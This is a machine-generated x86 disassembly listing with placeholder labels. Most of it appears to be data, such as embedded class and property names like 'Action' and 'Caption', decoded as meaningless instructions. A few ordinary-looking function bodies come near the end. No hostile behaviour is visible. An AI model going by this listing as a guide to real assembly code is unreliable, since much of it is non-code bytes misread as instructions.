imul ebp [ esi + 0x74 ] 0x9c007265
sbb [ ebp - 0x59efc3fd ] ebp
add eax 0x65530608
outsb
jb r-xdata
add [ esp + eax * 2 ] eax
dec ecx
add [ eax ] al
add ah bl
sbb [ ebp - 0x57c20ffd ] ch
add edx esp
inc ebp
jae r-xdata
push es
lodsb [ esi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add esi eax
sub ebp [ ebp - 0x57bfcbfd ]
add ebx [ eax - 0x47fc53fc ]
adc [ ebx + eax + sub_3a83e08 ] ch
in al 0xb
outsd
je r-xdata
add [ 0x6e756f43 ] eax
je r-xdata
push esp
inc ebx
jne r-xdata
jb r-xdata
jbe r-xdata
arpl [ esi + ebp * 2 + 0x73 ] si
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
cld
or eax 0x103ac
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
nop
jne r-xdata
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
xor al 0x2a
lodsd [ esi ]
add esi esp
inc eax
test al 0x3
cwde
inc eax
test al 0x3
in al dx
sub ebp [ ebp - 0x57bfa3fd ]
add ecx [ edx + ebp + 0x5ec03ad ]
lodsb [ esi ]
add esp eax
push cs
lodsb [ esi ]
add edi [ eax + 0xe ]
lodsb [ esi ]
add edx [ eax ]
adc ch [ ebx + eax + sub_3ad2bb4 ]
inc esp
lodsd [ cs : esi ]
add esi eax
sub eax 0x541203ad
push esi
imul esi [ edx + 0x74 ] 0x4c6c6175
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
nop
sbb [ ebp * 4 + 0x54120703 ] bl
push esi
imul esi [ edx + 0x74 ] 0x4c6c6175
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
mov al [ 0x2003ad1b ]
sbb ebp [ ebp + 0x9001103 ]
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add esp esp
or ebp [ ebx + eax + sub_3a839f4 ]
shr [ edx + 0x2bf003a7 ] 0x1
lodsd [ esi ]
add esi [ eax + eax * 2 ]
test al 0x3
cwde
add al 0xac
add edi [ eax + 0x803ac10 ]
test al 0x3
outsd
insd
push esi
imul esi [ edx + 0x74 ] 0x4c6c6175
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
movsb [ edi ] [ esi ]
sbb ch [ ebp - 0x52e663fd ]
add eax [ ebx ]
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
arpl [ gs : ebp + 0x64 ] si
insb
jbe r-xdata
add [ ecx + ebx + 0x103c03ad ] bl
cmpsb [ esi ] [ edi ]
dec ecx
outsb
je r-xdata
add edx [ eax + r-xdata ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x3ad19 ]
je r-xdata
add [ eax ] eax
or [ ebx + 0x6f ] dl
jb r-xdata
push eax
push ss
lodsd [ esi ]
add ebx [ 0xffffffffc8ff0000 ]
sub [ ebp + 0x103 ] ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] cl
push ebx
push 0x4374726f
adc [ esi + 0xc803 ] ah
call [ ebp + ebp + 0x103ad ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ esi + 0x6403 ] ah
call [ esp + ecx + 0x103ac ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc ebx
popad
jo r-xdata
add esi [ eax + eax ]
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ ebx + ecx + 0xbe403ac ]
lodsb [ esi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add esi eax
sub ebp [ ebp - 0x57bfcbfd ]
add ebx [ eax - 0x47fc53fc ]
adc [ ebx + eax + sub_3a83e08 ] ch
add [ eax + 0x3ad1b ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sbb al 0xad
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xad
add ebx eax
add [ eax ] al
add [ eax + 0x1a ] bl
lodsd [ esi ]
add esi eax
cmp eax 0x45d403a8
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
and al 0x1b
je r-xdata
outsb
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3ad19 ] ah
jb r-xdata
stosb [ edi ]
scasb [ edi ]
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
sbb [ ebp + 0xb803 ] ch
in al dx
add [ ebx + eax + sub_3ac1190 ] ebp
mov eax 0xec03ac11
adc [ ebx + eax - 0x80000000 ] ebp
add [ eax ] al
add [ eax + 0x5312000b ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
or [ eax ] eax
or [ ecx + 0x74 ] ecx
insd
dec ecx
outsb
js r-xdata
sub eax 0x103ad
jne r-xdata
jae r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
pushfd
sbb [ ebp - 0x59efc3fd ] ebp
sbb [ ebp + 0xc003 ] ch
push ebx
push 0x4374726f
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
[ eax ]
add eax [ eax + eax + 0xff4ff00 ]
lodsb [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
js r-xdata
js r-xdata
je r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
adc al 0x2
lodsb [ esi ]
add ecx [ eax - 0x77010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
rol [ eax ] 0x0
jae r-xdata
insd
jne r-xdata
inc ebx
or al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ esi + 0x7c03 ] ah
rol [ ebp - 0x5a ] 0x1
jb r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
add [ eax ] al
xor [ edi ] bl
insd
inc ebp
jbe r-xdata
adc [ esi + 0x8603 ] ah
[ eax + 0x10 ]
lodsb [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xcc656c62
sbb [ ebp + 0xd003 ] ebp
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000d ] al
outsb
inc edi
je r-xdata
add [ eax ] al
fcomp [ eax ]
lodsd [ esi ]
add esi eax
cmp eax 0x45d403a8
je r-xdata
jae r-xdata
add al 0x49
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
outsb
je r-xdata
dec ecx
je r-xdata
je r-xdata
add [ eax ] eax
je r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
aam 0x45
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add edi [ esi * 4 + 0x2f2403a7 ]
cmpsd [ esi ] [ edi ]
inc ebx
outsd
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add esp [ eax - 0x50 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add ecx esp
xor al 0x43
insd
adc [ esp + ecx * 2 + 0x69 ] dl
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] 0x1e40c08b
lodsd [ esi ]
add ecx [ eax ]
or eax 0x74654754
dec ecx
je r-xdata
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
dec edi
inc eax
insd
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
cld
or eax 0x103ac
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
nop
jne r-xdata
popad
lodsb [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
insd
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] ah
lodsd [ esi ]
add esp eax
add [ eax ] al
je r-xdata
lodsd [ esi ]
add esi esp
mov ah 0xa7
add edi [ eax + 0x6403ad30 ]
mov cl 0xa7
add esp eax
mov cl 0xa7
add ebx [ eax + ebp ]
lodsd [ esi ]
add edx [ eax ]
push esp
push ebx
je r-xdata
mov ch 0xa7
add esp [ edi + ebp ]
outsd
insb
dec ecx
je r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
add [ 0x6d657449 ] al
adc [ esi + 0xc803 ] ah
call [ ebp + ebp + 0x103ad ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
or [ eax ] eax
or [ ecx + 0x74 ] ecx
insd
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
add esi [ eax + eax ]
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
adc [ esi + 0x6403 ] ah
xchg esp eax
je r-xdata
test al 0x3
fadd [ ebp - 0x5a ]
sub al 0x37
insd
jae r-xdata
mov al 0xa7
add edi [ eax ]
mov ch 0xa7
insd
add [ ecx + ebx + 0x103c03ad ] bl
cmpsb [ esi ] [ edi ]
add ebx esp
adc eax 0xc08b03ad
in al dx
push ds
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
pop ds
je r-xdata
or [ ecx + ecx * 2 ] eax
dec ecx
outsb
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
je r-xdata
add [ eax ] al
inc [ eax ]
xor ebp [ ebp + 0x103 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
pop ds
lodsd [ esi ]
add edx eax
jae r-xdata
outsd
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop ds
lodsd [ esi ]
add ebp [ eax + eax ]
add [ eax ] al
sbb [ edi ] dl
lodsd [ esi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
inc eax
add [ eax ] dh
pop ds
lodsd [ esi ]
add edx esp
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
jae r-xdata
insd
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
add eax [ eax + eax + 0xff4ff00 ]
lodsb [ esi ]
add eax [ ecx ]
insd
mov [ eax ] ds
lodsd [ esi ]
add eax eax
add [ eax ] al
inc ebx
jne r-xdata
js r-xdata
js r-xdata
sub al 0xad
add eax [ ecx ]
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0x20
lodsd [ esi ]
add eax [ edi ]
pop ss
push esp
inc ebx
jne r-xdata
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
aam 0x31
lodsd [ esi ]
add esi esp
inc eax
test al 0x3
cwde
inc eax
test al 0x3
in al dx
sub ebp [ ebp - 0x57bfa3fd ]
add ecx [ edx + ebp + 0x5ec03ad ]
lodsb [ esi ]
add esp eax
push cs
lodsb [ esi ]
add edi [ eax + 0xe ]
lodsb [ esi ]
add edx [ eax ]
adc ch [ ebx + eax + sub_3ad3264 ]
fdiv [ edx ]
lodsd [ esi ]
add edx [ eax ]
xor ebp [ ebp - 0x52cd2bfd ]
add edx [ edi ]
push esp
inc ebx
jne r-xdata
xor ch [ ebp - 0x53f41bfd ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add esi eax
sub ebp [ ebp - 0x57bfcbfd ]
add ebx [ eax - 0x47fc53fc ]
adc [ ebx + eax + sub_3a83e08 ] ch
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ esi ] al
bound ebp [ ebp + 0x3c ]
push ds
lodsd [ esi ]
add ebx eax
add [ eax ] al
add [ eax ] al
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
adc al 0x2
lodsb [ esi ]
add ecx [ eax - 0x77010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
sbb [ ebp + 0xc003 ] ch
in al dx
add [ ebx + eax + sub_3ac1190 ] ebp
mov eax 0xec03ac11
adc [ ebx + eax - 0x80000000 ] ebp
add [ eax ] al
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
xchg esp eax
adc [ esi + 0x7c03 ] ah
je r-xdata
add edx esp
inc ebp
je r-xdata
test al 0x3
cwde
add al 0xac
popad
je r-xdata
add [ fs : eax ] al
je r-xdata
dec edi
add ch [ ebx + eax - 0xffff78 ]
push ebx
push 0x4374726f
jne r-xdata
add [ eax ] al
insd
push ebx
je r-xdata
or ebp [ ebx + eax + sub_3a839f4 ]
shr [ edx + 0x2bf003a7 ] 0x1
lodsd [ esi ]
add esi [ eax + eax * 2 ]
test al 0x3
cwde
add al 0xac
add edi [ eax + 0x803ac10 ]
test al 0x3
insd
jae r-xdata
add edi [ eax + 0x803ac10 ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
aam 0x31
lodsd [ esi ]
add esi esp
inc eax
test al 0x3
cwde
inc eax
test al 0x3
in al dx
sub ebp [ ebp - 0x57bfa3fd ]
add ecx [ edx + ebp + 0x5ec03ad ]
lodsb [ esi ]
add esp eax
push cs
lodsb [ esi ]
add edi [ eax + 0xe ]
lodsb [ esi ]
add edx [ eax ]
adc ch [ ebx + eax + sub_3ad3264 ]
fdiv [ edx ]
lodsd [ esi ]
add edx [ eax ]
xor ebp [ ebp - 0x52cd2bfd ]
add edx [ ecx ]
push esp
push ebx
je r-xdata
lodsb [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
and ebp [ ebp + 0xe003 ]
add [ eax + 0x1f ] bl
lodsd [ esi ]
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ edx + esi ]
lodsd [ esi ]
add esp esp
or ebp [ ebx + eax + sub_3a839f4 ]
shr [ edx + 0x2bf003a7 ] 0x1
lodsd [ esi ]
add esi [ eax + eax * 2 ]
lea eax [ eax ]
mov ah 0x22
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and ebp [ ebp + 0x3 ]
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
cld
or eax 0x103ac
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
nop
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc ebx
popad
jo r-xdata
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
mov [ eax ] al
add bh bh
jae r-xdata
jo r-xdata
je r-xdata
add eax [ edi ]
adc [ ebx + edx * 2 + 0x74 ] dl
popad
je r-xdata
push ds
lodsd [ esi ]
add esp [ edi + edx + 0x303ad ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add [ 0x6d657449 ] al
adc [ esi + 0xc803 ] ah
call [ ebp + ebp + 0x103ad ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
or [ eax ] eax
or [ ecx + 0x74 ] ecx
insd
dec ecx
outsb
js r-xdata
call [ esp + ecx + 0x103ac ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add esi [ eax + eax ]
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
xor [ ebx ] ah
lodsd [ esi ]
add eax [ edi ]
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
adc [ esi + 0x8603 ] ah
[ eax + 0x10 ]
lodsb [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ edx + esi ]
lodsd [ esi ]
add esp esp
add ah bl
sbb [ ebp - 0x57c20ffd ] ch
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] al
movsb [ edi ] [ esi ]
pop ds
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
and [ ebp + 0xe003 ] ch
add [ eax ] al
inc [ eax ]
xor ebp [ ebp + 0x103 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
pop ds
lodsd [ esi ]
add edx eax
jae r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
call [ esp + ecx + 0x103ac ]
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
pop ds
lodsd [ esi ]
add ebx [ ecx + ebx + 0x1203ad ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
jae r-xdata
insd
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
add eax [ eax + eax + 0xff4ff00 ]
lodsb [ esi ]
add eax [ ecx ]
insd
mov [ eax ] ds
lodsd [ esi ]
add eax eax
add [ eax ] al
inc ebx
jne r-xdata
js r-xdata
js r-xdata
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov ah 0x22
lodsd [ esi ]
add esp [ eax ]
and [ ebp + 0x9001203 ] ch
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
pop es
inc ebx
arpl [ esi + ebp * 2 + 0x73 ] si
sldt [ eax ]
adc [ esi + 0xa003 ] ah
jmp [ esp + ebp ]
add [ esi ] al
bound ebp [ ebp + 0x3c ]
push ds
lodsd [ esi ]
add ebx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x26 ] ch
lodsd [ esi ]
add ebp [ eax ]
add [ eax ] al
add al cl
scasd [ edi ]
stosb [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx esp
test al 0x3
mov esp 0x1003ab29
aas
test al 0x3
sbb al 0xe8
stosb [ edi ]
add esi [ ebx + esi - 0x53 ]
add edx eax
call 0x42412978
test al 0x3
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
adc al 0x2
lodsb [ esi ]
add ecx [ eax - 0x77010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
sbb [ ebp + 0xc003 ] ch
in al dx
add [ ebx + eax + sub_3ac1190 ] ebp
mov eax 0xec03ac11
adc [ ebx + eax - 0x80000000 ] ebp
add [ eax ] al
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
xchg esp eax
adc [ esi + 0x7c03 ] ah
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ esi + 0x6403 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
adc [ esi + 0xa003 ] ah
jmp [ esp + ebp ]
sub [ edi ] bh
test al 0x3
jl r-xdata
xchg esp eax
test al 0x3
popad
je r-xdata
sub [ ebx - 0x55169bfd ] ebp
add esp [ ecx + ebp * 8 - 0x1773fc56 ]
stosb [ edi ]
add esi [ ebx + ecx ]
lodsb [ esi ]
add edi [ eax ]
or ebp [ ebx + eax + sub_3aae8b0 ]
adc al 0xe7
stosb [ edi ]
add ebx [ edi - 0x56 ]
add ebp [ eax - 0x4ffc5519 ]
in eax 0xaa
add esp [ eax + ebp * 8 - 0x56 ]
add ecx [ eax - 0x3bfc5518 ]
jmp 0x36e129f8
test al 0x3
mov al [ 0x5c03aae6 ]
or ch [ ebx + eax + sub_3aae728 ]
test [ edx ] cl
lodsb [ esi ]
add esp eax
sub [ ebx - 0x551703fd ] ebp
add esi [ eax - 0x19 ]
stosb [ edi ]
add edx esp
or ch [ ebx + eax + sub_3ac0ae8 ]
call 0x13b0d0e8
or ebp [ ebx + eax + sub_3aae844 ]
sbb [ ebx ] cl
lodsb [ esi ]
add ebp [ eax - 0x18 ]
stosb [ edi ]
add esp [ eax ]
or ebp [ ebx + eax + sub_3ab29e8 ]
jmp 0xffffffffed5129c8
dec edi
add ch [ ebx + eax - 0xffff78 ]
push ebx
push 0x4374726f
jne r-xdata
nop
mov eax 0x3ad25
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
mov [ eax ] al
add bh bh
jae r-xdata
adc [ esi + 0x8603 ] ah
[ eax + 0x10 ]
lodsb [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_3ad2678
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_3ad26f3
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_3ad2710
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a7ae30
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad274c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx esi
mov eax ebx
call sub_3a7aed4
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3ad27b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_3ad29b4
push eax
mov edx esi
mov eax ebx
call sub_3ad29b4
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_3ad27ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_3a7b21c
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_3a7b21c
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_3ad2920
sub_3ad281c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx edx
cmp [ eax + 0x22 ] 0x0
je r-xdata
